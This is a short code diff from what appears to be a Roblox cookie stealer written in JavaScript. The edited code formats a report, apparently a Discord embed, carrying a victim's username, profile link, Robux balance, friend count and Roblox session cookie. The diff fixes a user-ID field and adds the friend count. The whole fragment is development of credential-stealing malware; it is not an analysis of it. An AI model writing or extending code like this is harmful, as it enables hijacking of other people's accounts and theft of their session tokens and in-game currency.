@@ -121,9 +121,14 @@ const json = async (zipFile) => {
       author: {
         name: robloxInfo.UserName,
         icon_url: robloxInfo.ThumbnailUrl,
-        url: `https://www.roblox.com/users/${robloxInfo.UserId}/profile`
+        url: `https://www.roblox.com/users/${robloxInfo.UserID}/profile`
       },
-      description: `💎 Robux Balance: ${robloxInfo.RobuxBalance} Robux\n🍪 Cookie: ${codeBlock(robloxInfo.cookie)}`,
+      description:
+        [
+          `💎 Robux Balance: ${robloxInfo.RobuxBalance} Robux`,
+          `👾 Friends: ${robloxInfo.friendsCount || 'Unknown'}`,
+          `🍪 Cookie: ${codeBlock(robloxInfo.cookie)}`
+        ].join('\n'),
       thumbnail: {
         url: robloxInfo.ThumbnailUrl
       }
